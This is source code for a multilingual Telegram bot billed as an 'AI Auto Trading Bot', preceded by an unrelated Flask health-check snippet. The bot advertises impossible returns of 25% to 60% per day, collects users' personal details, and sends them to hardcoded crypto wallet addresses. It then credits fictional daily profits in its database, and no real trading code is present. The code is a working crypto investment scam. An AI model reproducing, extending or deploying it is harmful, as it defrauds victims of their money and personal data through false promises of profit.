from flask import Flask, request
import threading

app = Flask(__name__)

@app.route('/healthz')
def healthz():
    return "OK", 200

def run_flask():
    app.run(host="0.0.0.0", port=8080)
#!/usr/bin/env python3
import os
import asyncio
import logging
import datetime
from contextlib import contextmanager
from typing import Optional, Tuple, Dict, Union

import aiohttp
from aiohttp import web
import telegram
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes
)
from sqlalchemy import create_engine, Column, Integer, BigInteger, String, Float, Boolean, DateTime
from sqlalchemy.exc import SQLAlchemyError
from sqlalchemy.orm import declarative_base, sessionmaker

# ========================
# Logging
# ========================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========================
# Env Vars
# ========================
TGBOTTOKEN       = os.environ["TGBOTTOKEN"]
ADMIN_ID         = int(os.environ["ADMIN_ID"])
DATABASE_URL     = os.environ["DATABASE_URL"]
WEBHOOK_BASE_URL = os.environ.get("WEBHOOK_BASE_URL", "").rstrip("/")
WEBHOOK_SECRET   = os.environ.get("WEBHOOK_SECRET", "")
# --- Render/webhook helpers ---
RENDER_HOST = os.environ.get("RENDER_EXTERNAL_HOSTNAME", "")
WEBHOOK_BASE_URL = (os.environ.get("WEBHOOK_BASE_URL", "") or "").rstrip("/")
if not WEBHOOK_BASE_URL and RENDER_HOST:
    # Build it automatically on Render if not explicitly set
    WEBHOOK_BASE_URL = f"https://{RENDER_HOST}"

# Define the port used by Render so your webhook branch works
render_port = int(os.environ.get("PORT", "8080"))


# ========================
# Database
# ========================
Base = declarative_base()
engine = create_engine(DATABASE_URL, echo=False, pool_pre_ping=True)
SessionLocal = sessionmaker(bind=engine, expire_on_commit=False)

class UserAccount(Base):
    __tablename__ = "user_accounts"
    id              = Column(Integer, primary_key=True)
    telegram_id     = Column(BigInteger, unique=True, nullable=False)
    full_name       = Column(String)
    email           = Column(String)
    country         = Column(String)
    selected_plan   = Column(String)
    selected_crypto = Column(String)
    usdt_network    = Column(String)
    txid            = Column(String)
    deposit         = Column(Float, default=0)
    profit          = Column(Float, default=0)
    wallet_address  = Column(String)
    language        = Column(String, default="en")
    compound        = Column(Boolean, default=False)
    last_updated    = Column(DateTime, default=datetime.datetime.utcnow,
                             onupdate=datetime.datetime.utcnow)

# ========================
# DB session helper
# ========================
@contextmanager
def db_session():
    session = SessionLocal()
    try:
        yield session
        session.commit()
    except SQLAlchemyError as e:
        session.rollback()
        logger.error(f"Database error: {e}")
        raise
    finally:
        session.close()

# ========================
# Health Server
# ========================
async def _health(request):
    return web.Response(text="OK")

async def _start_health_server(port: int):
    app = web.Application()
    app.router.add_get("/healthz", _health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logger.info(f"✅ Health server running on port {port}/healthz")

def start_health_server(port: int):
    loop = asyncio.get_event_loop()
    loop.create_task(_start_health_server(port))


# ========================
# Wallet Addresses & Constants
# ========================
WALLET_ADDRESSES = {
    "BTC": "bc1q9q75pdqn68kd9l3phk45lu9jdujuckewq6utp4",
    "ETH": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
    "BNB": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
    "SOL": "5ZE32mbM9Xy6hTvTUNjUrZ9NdmmBMRDgU9Gif4ytPsZg",
    "XRP": "rDBY4hZmoHzZJxkDbeeVdSU52WaXRtXSMJ",
    "USDT": {
        "BEP20": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
        "TRC20": "TXPJLFHcjfk9rGrHQkdC6nLqADg85Z9TT2",
        "TON":   "UQAC8C-BwxCCQKybyR1I3faHNg_PtHnVS2VytwC9XhE2alLo",
    },
}

TRADING_PLANS = {
    "plan_1": {"title": "🚨FIRST PLAN",  "equity_range": "$500 - $999",       "profit_percent": 25},
    "plan_2": {"title": "🚨SECOND PLAN", "equity_range": "$1,000 - $4,999",     "profit_percent": 30},
    "plan_3": {"title": "🚨THIRD PLAN",  "equity_range": "$5,000 - $9,999",     "profit_percent": 45},
    "plan_4": {"title": "🚨FOURTH PLAN", "equity_range": "$10,000 - $49,999",   "profit_percent": 50},
    "plan_5": {"title": "🚨FIFTH PLAN",  "equity_range": "$50,000 - $199,999",  "profit_percent": 55},
    "plan_6": {"title": "🚨SIXTH PLAN",  "equity_range": "$200,000 and above", "profit_percent": 60},
}

# Conversation states
(
    STATE_TXID, STATE_CONFIRM, STATE_WALLET,
    STATE_NAME, STATE_EMAIL, STATE_COUNTRY, STATE_USDT_TRC20,
    STATE_AD_TEXT, STATE_AD_MEDIA, STATE_AD_TARGET,
    ADMIN_MAIN, ADMIN_USER_SELECT, ADMIN_BALANCE_EDIT, STATE_ADMIN_BALANCE
) = range(1, 15)


# ========================
# Multilanguage Messages
# ========================
LANG = {
    "en": {
        "welcome":         "Welcome to the AI Auto Trading Bot. Please choose an option:",
        "autotrading":     "Autotrading System",
        "balance":         "Balance",
        "contact_support": "Contact Support",
        "main_menu":       "Main Menu:",
        "deposit_success": "Deposit of ${amount:.2f} confirmed successfully! Please provide your wallet address for receiving your profits:",
        "activated":       "AI AUTO TRADING SYSTEM ACTIVATED.",
        "invalid_txid":    "Invalid transaction ID format. Please try again:",
        "txid_received":   "Transaction ID received: {txid}\nWe have verified a deposit of ${amount:.2f} based on your selected plan.\nPlease confirm the deposit.",
        "choose_language": "Choose your language:",
        "compound_on":     "Compound profit activated.",
        "compound_off":    "Compound profit deactivated.",
        "admin_not_auth":  "You are not authorized to use this command.",
        "ask_name":        "Please enter your full name:",
        "ask_email":       "Please enter your email address:",
        "ask_country":     "Please enter your country:",
        "ask_usdt_trc20":  "Please enter your USDT TRC20 address for receiving your profits:",
        "details_saved":   "Details saved. Now choose your deposit currency:",
    },
    "es": {
        "welcome":         "Bienvenido al Bot de Comercio Automático de IA. Por favor, elige una opción:",
        "autotrading":     "Sistema de Comercio Automático",
        "balance":         "Saldo",
        "contact_support": "Contactar Soporte",
        "main_menu":       "Menú Principal:",
        "deposit_success": "Depósito de ${amount:.2f} confirmado con éxito. Por favor, proporciona tu dirección de billetera para recibir tus ganancias:",
        "activated":       "SISTEMA DE COMERCIO AUTOMÁTICO IA ACTIVADO.",
        "invalid_txid":    "Formato de ID de transacción inválido. Por favor, inténtalo de nuevo:",
        "txid_received":   "ID de transacción recibido: {txid}\nHemos verificado un depósito de ${amount:.2f} basado en el plan seleccionado.\nPor favor, confirma el depósito.",
        "choose_language": "Elige tu idioma:",
        "compound_on":     "Beneficio de capitalización activado.",
        "compound_off":    "Beneficio de capitalización desactivado.",
        "admin_not_auth":  "No estás autorizado para usar este comando.",
        "ask_name":        "Por favor, ingresa tu nombre completo:",
        "ask_email":       "Por favor, ingresa tu dirección de correo electrónico:",
        "ask_country":     "Por favor, ingresa tu país:",
        "ask_usdt_trc20":  "Por favor, ingresa tu dirección USDT TRC20 para recibir tus ganancias:",
        "details_saved":   "Detalles guardados. Ahora elige tu moneda de depósito:",
    },
    "fr": {
        "welcome":         "Bienvenue sur le Bot de Trading Automatique IA. Veuillez choisir une option :",
        "autotrading":     "Système de Trading Automatique",
        "balance":         "Solde",
        "contact_support": "Contacter le Support",
        "main_menu":       "Menu Principal :",
        "deposit_success": "Dépôt de ${amount:.2f} confirmé avec succès ! Veuillez fournir votre adresse de portefeuille pour recevoir vos bénéfices :",
        "activated":       "SYSTÈME DE TRADING AUTOMATIQUE IA ACTIVÉ.",
        "invalid_txid":    "Format d'ID de transaction invalide. Veuillez réessayer :",
        "txid_received":   "ID de transaction reçu : {txid}\nNous avons vérifié un dépôt de ${amount:.2f} selon votre plan sélectionné.\nVeuillez confirmer le dépôt.",
        "choose_language": "Choisissez votre langue :",
        "compound_on":     "Capitalisation des bénéfices activée.",
        "compound_off":    "Capitalisation des bénéfices désactivée.",
        "admin_not_auth":  "Vous n'êtes pas autorisé à utiliser cette commande.",
        "ask_name":        "Veuillez entrer votre nom complet :",
        "ask_email":       "Veuillez entrer votre adresse email :",
        "ask_country":     "Veuillez entrer votre pays :",
        "ask_usdt_trc20":  "Veuillez entrer votre adresse USDT TRC20 pour recevoir vos profits :",
        "details_saved":   "Détails enregistrés. Maintenant, choisissez votre devise de dépôt :",
    },
    "ru": {
        "welcome":         "Добро пожаловать в бота автоматической торговли на ИИ. Пожалуйста, выберите опцию:",
        "autotrading":     "Система Автоматической Торговли",
        "balance":         "Баланс",
        "contact_support": "Связаться с Поддержкой",
        "main_menu":       "Главное Меню:",
        "deposit_success": "Депозит ${amount:.2f} успешно подтверждён! Пожалуйста, предоставьте адрес вашего кошелька для получения прибыли:",
        "activated":       "СИСТЕМА АВТОМАТИЧЕСКОЙ ТОРГОВЛИ НА ИИ АКТИВИРОВАНА.",
        "invalid_txid":    "Неверный формат ID транзакции. Пожалуйста, попробуйте еще раз:",
        "txid_received":   "ID транзакции получен: {txid}\nМы подтвердили депозит в размере ${amount:.2f} по вашему выбранному плану.\nПожалуйста, подтвердите депозит.",
        "choose_language": "Выберите ваш язык:",
        "compound_on":     "Капитализация прибыли активирована.",
        "compound_off":    "Капитализация прибыли деактивирована.",
        "admin_not_auth":  "У вас нет прав для использования этой команды.",
        "ask_name":        "Пожалуйста, введите ваше полное имя:",
        "ask_email":       "Пожалуйста, введите ваш адрес электронной почты:",
        "ask_country":     "Пожалуйста, введите вашу страну:",
        "ask_usdt_trc20":  "Пожалуйста, введите ваш USDT TRC20 адрес для получения прибыли:",
        "details_saved":   "Данные сохранены. Теперь выберите валюту депозита:",
    },
    "ar": {
        "welcome":         "مرحبًا بك في بوت التداول الآلي بالذكاء الاصطناعي. الرجاء اختيار خيار:",
        "autotrading":     "نظام التداول الآلي",
        "balance":         "الرصيد",
        "contact_support": "الاتصال بالدعم",
        "main_menu":       "القائمة الرئيسية:",
        "deposit_success": "تم تأكيد إيداع ${amount:.2f} بنجاح! الرجاء تزويدنا بعنوان محفظتك لاستلام أرباحك:",
        "activated":       "تم تفعيل نظام التداول الآلي بالذكاء الاصطناعي.",
        "invalid_txid":    "تنسيق معرّف المعاملة غير صالح. الرجاء المحاولة مرة أخرى:",
        "txid_received":   "تم استلام معرف المعاملة: {txid}\nلقد قمنا بالتحقق من إيداع بقيمة ${amount:.2f} بناءً على الخطة التي اخترتها.\nالرجاء تأكيد الإيداع.",
        "choose_language": "اختر لغتك:",
        "compound_on":     "تم تفعيل تراكم الأرباح.",
        "compound_off":    "تم إلغاء تفعيل تراكم الأرباح.",
        "admin_not_auth":  "ليس لديك صلاحية لاستخدام هذا الأمر.",
        "ask_name":        "الرجاء إدخال اسمك الكامل:",
        "ask_email":       "الرجاء إدخال عنوان بريدك الإلكتروني:",
        "ask_country":     "الرجاء إدخال بلدك:",
        "ask_usdt_trc20":  "الرجاء إدخال عنوان USDT TRC20 الخاص بك لاستلام أرباحك:",
        "details_saved":   "تم حفظ التفاصيل. الآن اختر عملة الإيداع الخاصة بك:",
    },
    "id": {
        "welcome":         "Selamat datang di Bot Perdagangan Otomatis AI. Silakan pilih opsi:",
        "autotrading":     "Sistem Perdagangan Otomatis",
        "balance":         "Saldo",
        "contact_support": "Hubungi Dukungan",
        "main_menu":       "Menu Utama:",
        "deposit_success": "Deposit sebesar ${amount:.2f} berhasil dikonfirmasi! Silakan berikan alamat dompet Anda untuk menerima keuntungan Anda:",
        "activated":       "SISTEM PERDAGANGAN OTOMATIS AI DIHIDUPKAN.",
        "invalid_txid":    "Format ID transaksi tidak valid. Silakan coba lagi:",
        "txid_received":   "ID transaksi diterima: {txid}\nKami telah memverifikasi deposit sebesar ${amount:.2f} berdasarkan paket yang Anda pilih.\nSilakan konfirmasi deposit.",
        "choose_language": "Pilih bahasa Anda:",
        "compound_on":     "Profit kompaun diaktifkan.",
        "compound_off":    "Profit kompaun dinonaktifkan.",
        "admin_not_auth":  "Anda tidak diizinkan menggunakan perintah ini.",
        "ask_name":        "Silakan masukkan nama lengkap Anda:",
        "ask_email":       "Silakan masukkan alamat email Anda:",
        "ask_country":     "Silakan masukkan negara Anda:",
        "ask_usdt_trc20":  "Silakan masukkan alamat USDT TRC20 Anda untuk menerima keuntungan Anda:",
        "details_saved":   "Detail disimpan. Sekarang pilih mata uang deposit Anda:",
    },
    "de": {
        "welcome":         "Willkommen beim KI-Auto-Trading-Bot. Bitte wählen Sie eine Option:",
        "autotrading":     "Auto-Trading-System",
        "balance":         "Kontostand",
        "contact_support": "Support kontaktieren",
        "main_menu":       "Hauptmenü:",
        "deposit_success": "Einzahlung von ${amount:.2f} erfolgreich bestätigt! Bitte geben Sie Ihre Wallet-Adresse für den Erhalt Ihrer Gewinne an:",
        "activated":       "KI-AUTO-TRADING-SYSTEM AKTIVIERT.",
        "invalid_txid":    "Ungültiges Transaktions-ID-Format. Bitte versuchen Sie es erneut:",
        "txid_received":   "Transaktions-ID erhalten: {txid}\nWir haben eine Einzahlung von ${amount:.2f} basierend auf Ihrem gewählten Plan verifiziert.\nBitte bestätigen Sie die Einzahlung.",
        "choose_language": "Wählen Sie Ihre Sprache:",
        "compound_on":     "Gewinnverzinsung aktiviert.",
        "compound_off":    "Gewinnverzinsung deaktiviert.",
        "admin_not_auth":  "Sie sind nicht berechtigt, diesen Befehl zu verwenden.",
        "ask_name":        "Bitte geben Sie Ihren vollständigen Namen ein:",
        "ask_email":       "Bitte geben Sie Ihre E-Mail-Adresse ein:",
        "ask_country":     "Bitte geben Sie Ihr Land ein:",
        "ask_usdt_trc20":  "Bitte geben Sie Ihre USDT TRC20-Adresse ein, um Ihre Gewinne zu erhalten:",
        "details_saved":   "Details gespeichert. Wählen Sie jetzt Ihre Einzahlungwährung:",
    },
    "hi": {
        "welcome":         "एआई ऑटो ट्रेडिंग बॉट में आपका स्वागत है। कृपया एक विकल्प चुनें:",
        "autotrading":     "ऑटो ट्रेडिंग सिस्टम",
        "balance":         "बैलेंस",
        "contact_support": "सपोर्ट से संपर्क करें",
        "main_menu":       "मुख्य मेन्यू:",
        "deposit_success": "${amount:.2f} का डिपॉजिट सफलतापूर्वक कन्फर्म हो गया! कृपया अपने वॉलेट एड्रेस प्रदान करें ताकि आपको आपके मुनाफे मिल सकें:",
        "activated":       "एआई ऑटो ट्रेडिंग सिस्टम सक्रिय कर दिया गया है।",
        "invalid_txid":    "ट्रांजैक्शन ID का फॉर्मेट अमान्य है। कृपया पुनः प्रयास करें:",
        "txid_received":   "ट्रांजैक्शन ID प्राप्त हुआ: {txid}\nहमने आपके चुने हुए प्लान के आधार पर ${amount:.2f} का डिपॉजिट सत्यापित कर लिया है।\nकृपया डिपॉजिट की पुष्टि करें।",
        "choose_language": "अपनी भाषा चुनें:",
        "compound_on":     "कम्पाउंड प्रॉफिट सक्रिय किया गया।",
        "compound_off":    "कम्पाउंड प्रॉफिट निष्क्रिय किया गया।",
        "admin_not_auth":  "आप इस कमांड का उपयोग करने के लिए अधिकृत नहीं हैं।",
        "ask_name":        "कृपया अपना पूरा नाम दर्ज करें:",
        "ask_email":       "कृपया अपना ईमेल पता दर्ज करें:",
        "ask_country":     "कृपया अपना देश दर्ज करें:",
        "ask_usdt_trc20":  "कृपया अपना USDT TRC20 पता दर्ज करें ताकि आप अपनी आय प्राप्त कर सकें:",
        "details_saved":   "विवरण सहेजे गए। अब अपनी जमा मुद्रा चुनें:",
    },
    "zh": {
        "welcome":         "欢迎使用AI自动交易机器人。请选择一个选项：",
        "autotrading":     "自动交易系统",
        "balance":         "余额",
        "contact_support": "联系客服",
        "main_menu":       "主菜单：",
        "deposit_success": "已成功确认${amount:.2f}的存款！请提供您的钱包地址以接收收益：",
        "activated":       "AI自动交易系统已激活。",
        "invalid_txid":    "交易ID格式无效。请再试一次：",
        "txid_received":   "已收到交易ID：{txid}\n我们已根据您选择的方案验证了${amount:.2f}的存款。\n请确认存款。",
        "choose_language": "请选择您的语言：",
        "compound_on":     "复利已激活。",
        "compound_off":    "复利已停用。",
        "admin_not_auth":  "您无权使用此命令。",
        "ask_name":        "请输入您的全名：",
        "ask_email":       "请输入您的电子邮件地址：",
        "ask_country":     "请输入您的国家：",
        "ask_usdt_trc20":  "请输入您的USDT TRC20地址以接收收益：",
        "details_saved":   "详情已保存。现在选择您的存款货币：",
    },
}

# keep helper for messages (safe default)
def get_msg(lang: str, key: str, **kwargs) -> str:
    d = LANG.get(lang, LANG["en"])
    msg = d.get(key, LANG["en"].get(key, key))
    return msg.format(**kwargs) if kwargs else msg


# ========================
# Blockchain Verification
# ========================
async def verify_txid_on_blockchain(txid: str, crypto: str, context: ContextTypes.DEFAULT_TYPE = None) -> bool:
    crypto = crypto.upper()
    async with aiohttp.ClientSession() as session:
        try:
            if crypto == "ETH":
                key = os.environ.get("ETHERSCAN_API_KEY")
                if not key:
                    return False
                url = f"https://api.etherscan.io/api?module=transaction&action=getstatus&txhash={txid}&apikey={key}"
                r = await session.get(url, timeout=10); data = await r.json()
                return data.get("status") == "1" and data.get("result", {}).get("txreceipt_status") == "1"

            if crypto == "BTC":
                token = os.environ.get("BLOCKCYPHER_TOKEN")
                if not token:
                    return False
                url = f"https://api.blockcypher.com/v1/btc/main/txs/{txid}?token={token}"
                r = await session.get(url, timeout=10); data = await r.json()
                return data.get("confirmations", 0) > 0

            if crypto == "BNB":
                key = os.environ.get("BSCSCAN_API_KEY")
                if not key:
                    return False
                url = f"https://api.bscscan.com/api?module=transaction&action=getstatus&txhash={txid}&apikey={key}"
                r = await session.get(url, timeout=10); data = await r.json()
                return data.get("status") == "1" and data.get("result", {}).get("txreceipt_status") == "1"

            if crypto == "SOL":
                url = "https://api.mainnet-beta.solana.com/"
                payload = {"jsonrpc":"2.0","id":1,"method":"getTransaction","params":[txid,{"encoding":"json"}]}
                r = await session.post(url, json=payload, timeout=10); data = await r.json()
                return data.get("result") is not None

            if crypto == "XRP":
                url = f"https://data.ripple.com/v2/transactions/{txid}"
                r = await session.get(url, timeout=10); data = await r.json()
                return data.get("result") == "success"

            if crypto == "TRX":
                url = f"https://apilist.tronscan.org/api/transaction-info?hash={txid}"
                r = await session.get(url, timeout=10); data = await r.json()
                ret = data.get("ret")
                return isinstance(ret, list) and ret and ret[0].get("contractRet") == "SUCCESS"

            if crypto == "TON":
                key = os.environ.get("TONCENTER_API_KEY")
                if not key:
                    return False
                url = f"https://toncenter.com/api/v2/getTransaction?hash={txid}&api_key={key}"
                r = await session.get(url, timeout=10); data = await r.json()
                return data.get("result") is not None

            if crypto == "USDT" and context:
                net = context.user_data.get("usdt_network", "ETH")
                return await verify_txid_on_blockchain(txid, net, context)

        except Exception as e:
            logger.error("Error verifying %s TXID: %s", crypto, e)

    return False


# ========================
# Daily Profit Update
# ========================
async def update_daily_profits(context: ContextTypes.DEFAULT_TYPE):
    with db_session() as session:
        users = session.query(UserAccount).all()
        for user in users:
            if user.selected_plan and user.deposit > 0:
                rate = TRADING_PLANS[user.selected_plan]["profit_percent"] / 100
                profit = user.deposit * rate
                user.profit += profit
                if user.compound:
                    user.deposit += profit
    logger.info("Daily profits updated for %d users", len(users))


# ========================
# Error Handler
# ========================
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception while handling an update:", exc_info=context.error)
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"⚠️ Error: {context.error}")
    except Exception:
        pass


# ========================
# Bot Handlers (kept your logic)
# ========================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    if not user or not user.language:
        await choose_language(update, context)
        return

    lang = user.language
    kb = [
        [InlineKeyboardButton(get_msg(lang, "autotrading"), callback_data="autotrading")],
        [InlineKeyboardButton(get_msg(lang, "balance"),     callback_data="balance")],
        [InlineKeyboardButton(get_msg(lang, "contact_support"), url="https://t.me/cryptotitan999")],
    ]
    if update.message:
        await update.message.reply_text(get_msg(lang, "welcome"), reply_markup=InlineKeyboardMarkup(kb))


async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"

    kb = [
        [InlineKeyboardButton(get_msg(lang, "autotrading"), callback_data="autotrading")],
        [InlineKeyboardButton(get_msg(lang, "balance"),     callback_data="balance")],
        [InlineKeyboardButton(get_msg(lang, "contact_support"), url="https://t.me/cryptotitan999")],
    ]
    await update.callback_query.edit_message_text(get_msg(lang, "main_menu"), reply_markup=InlineKeyboardMarkup(kb))


async def autotrading_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"

    lines = ["AI AUTO TRADING PLANS:"]
    for key, plan in TRADING_PLANS.items():
        lines.extend([
            "",
            plan["title"],
            f"Equity Range: {plan['equity_range']}",
            f"Profit: {plan['profit_percent']}% daily.",
            "ROI: Yes ✅"
        ])

    kb = [
        [InlineKeyboardButton("FIRST PLAN",  callback_data="plan_1"),
         InlineKeyboardButton("SECOND PLAN", callback_data="plan_2")],
        [InlineKeyboardButton("THIRD PLAN",  callback_data="plan_3"),
         InlineKeyboardButton("FOURTH PLAN", callback_data="plan_4")],
        [InlineKeyboardButton("FIFTH PLAN",  callback_data="plan_5"),
         InlineKeyboardButton("SIXTH PLAN",  callback_data="plan_6")],
        [InlineKeyboardButton("BACK",        callback_data="main_menu")],
    ]
    await update.callback_query.edit_message_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(kb))


async def plan_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    plan = update.callback_query.data
    context.user_data["selected_plan"] = plan
    details = TRADING_PLANS[plan]

    text = (
        f"You selected {details['title']}:\n"
        f"Equity Range: {details['equity_range']}\n"
        f"Profit: {details['profit_percent']}% daily.\n\n"
        "Before proceeding, please provide depositor details."
    )
    kb = [
        [InlineKeyboardButton("PROVIDE DETAILS", callback_data="collect_details")],
        [InlineKeyboardButton("CANCEL",          callback_data="main_menu")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))


async def start_collect_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"

    await update.callback_query.edit_message_text(get_msg(lang, "ask_name"))
    return STATE_NAME


async def handle_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["depositor_name"] = update.message.text.strip()
    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"
    await update.message.reply_text(get_msg(lang, "ask_email"))
    return STATE_EMAIL


async def handle_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["depositor_email"] = update.message.text.strip()
    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"
    await update.message.reply_text(get_msg(lang, "ask_country"))
    return STATE_COUNTRY


async def handle_country(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["depositor_country"] = update.message.text.strip()
    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"
    await update.message.reply_text(get_msg(lang, "ask_usdt_trc20"))
    return STATE_USDT_TRC20


async def handle_usdt_trc20(update: Update, context: ContextTypes.DEFAULT_TYPE):
    addr = update.message.text.strip()
    context.user_data["depositor_usdt_trc20"] = addr

    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
        if user:
            user.full_name      = context.user_data["depositor_name"]
            user.email          = context.user_data["depositor_email"]
            user.country        = context.user_data["depositor_country"]
            user.wallet_address = addr
            user.selected_plan  = context.user_data["selected_plan"]
        else:
            user = UserAccount(
                telegram_id     = update.effective_user.id,
                full_name       = context.user_data["depositor_name"],
                email           = context.user_data["depositor_email"],
                country         = context.user_data["depositor_country"],
                wallet_address  = addr,
                selected_plan   = context.user_data["selected_plan"],
                language        = "en",
            )
            session.add(user)
    lang = user.language

    kb = [
        [InlineKeyboardButton("BTC",  callback_data="pay_btc"),
         InlineKeyboardButton("ETH",  callback_data="pay_eth")],
        [InlineKeyboardButton("USDT", callback_data="pay_usdt"),
         InlineKeyboardButton("BNB",  callback_data="pay_bnb")],
        [InlineKeyboardButton("SOL",  callback_data="pay_sol"),
         InlineKeyboardButton("XRP",  callback_data="pay_xrp")],
        [InlineKeyboardButton("BACK", callback_data="autotrading")],
    ]
    await update.message.reply_text(get_msg(lang, "details_saved"), reply_markup=InlineKeyboardMarkup(kb))
    return ConversationHandler.END


async def payment_method_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"

    plan = context.user_data.get("selected_plan", "")
    text = (
        f"You selected {TRADING_PLANS[plan]['title']}.\nChoose your deposit currency:"
        if plan in TRADING_PLANS else
        "Choose your deposit currency:"
    )
    kb = [
        [InlineKeyboardButton("BTC",  callback_data="pay_btc"),
         InlineKeyboardButton("ETH",  callback_data="pay_eth")],
        [InlineKeyboardButton("USDT", callback_data="pay_usdt"),
         InlineKeyboardButton("BNB",  callback_data="pay_bnb")],
        [InlineKeyboardButton("SOL",  callback_data="pay_sol"),
         InlineKeyboardButton("XRP",  callback_data="pay_xrp")],
        [InlineKeyboardButton("BACK", callback_data="autotrading")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))


async def usdt_network_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    kb = [
        [InlineKeyboardButton("USDT BEP20", callback_data="usdt_BEP20"),
         InlineKeyboardButton("USDT TRC20", callback_data="usdt_TRC20"),
         InlineKeyboardButton("USDT TON",   callback_data="usdt_TON")],
        [InlineKeyboardButton("BACK", callback_data="payment_method")],
    ]
    await update.callback_query.edit_message_text("USDT selected. Please choose the USDT network:", reply_markup=InlineKeyboardMarkup(kb))


async def send_deposit_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    data = update.callback_query.data
    if data.startswith("pay_"):
        crypto = data.split("_")[1].upper()
        network = None
    elif data.startswith("usdt_"):
        crypto = "USDT"
        network = data.split("_")[1]
        context.user_data["usdt_network"] = network
    else:
        return

    context.user_data["selected_crypto"] = crypto
    if crypto == "USDT" and network:
        addr = WALLET_ADDRESSES["USDT"].get(network, "Not configured")
        disp = f"{crypto} ({network})"
    else:
        addr = WALLET_ADDRESSES.get(crypto, "Not configured")
        disp = crypto

    text = (
        f"Please deposit using {disp} to the following address:\n\n"
        f"<code>{addr}</code>\n\nWhen done, click DONE."
    )
    kb = [
        [InlineKeyboardButton("DONE", callback_data="deposit_done"),
         InlineKeyboardButton("BACK", callback_data="payment_method")],
    ]
    await update.callback_query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))


async def payment_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = update.callback_query.data
    if data in ("pay_btc", "pay_eth", "pay_bnb", "pay_sol", "pay_xrp"):
        await send_deposit_address(update, context)
    elif data == "pay_usdt":
        await usdt_network_menu(update, context)
    elif data.startswith("usdt_"):
        await send_deposit_address(update, context)
    elif data == "payment_method":
        await payment_method_menu(update, context)


async def deposit_done_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass
    await update.callback_query.edit_message_text("Please enter your transaction ID:")
    return STATE_TXID


async def handle_txid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    txid = update.message.text.strip()
    crypto = context.user_data.get("selected_crypto", "BTC")
    verified = await verify_txid_on_blockchain(txid, crypto, context)

    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
        lang = user.language if user else "en"

        if not verified:
            await update.message.reply_text(get_msg(lang, "invalid_txid"))
            return STATE_TXID

        deposit_amount = {
            "plan_1": 500,    "plan_2": 1000,   "plan_3": 5000,
            "plan_4": 10000,  "plan_5": 50000,  "plan_6": 200000
        }.get(context.user_data.get("selected_plan", ""), 0)

        context.user_data.update({
            "txid":   txid,
            "deposit": deposit_amount
        })

        if user:
            user.selected_plan   = context.user_data["selected_plan"]
            user.selected_crypto = context.user_data["selected_crypto"]
            user.usdt_network    = context.user_data.get("usdt_network")
            user.txid            = txid
            user.deposit         = deposit_amount
        else:
            user = UserAccount(
                telegram_id     = update.effective_user.id,
                selected_plan   = context.user_data["selected_plan"],
                selected_crypto = context.user_data["selected_crypto"],
                usdt_network    = context.user_data.get("usdt_network"),
                txid            = txid,
                deposit         = deposit_amount,
                profit          = 0.0,
                wallet_address  = context.user_data.get("depositor_usdt_trc20"),
                language        = "en"
            )
            session.add(user)

    text = get_msg(lang, "txid_received", txid=txid, amount=deposit_amount)
    kb   = [
        [InlineKeyboardButton("YES", callback_data="confirm_yes"),
         InlineKeyboardButton("NO",  callback_data="confirm_no")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb))
    return STATE_CONFIRM


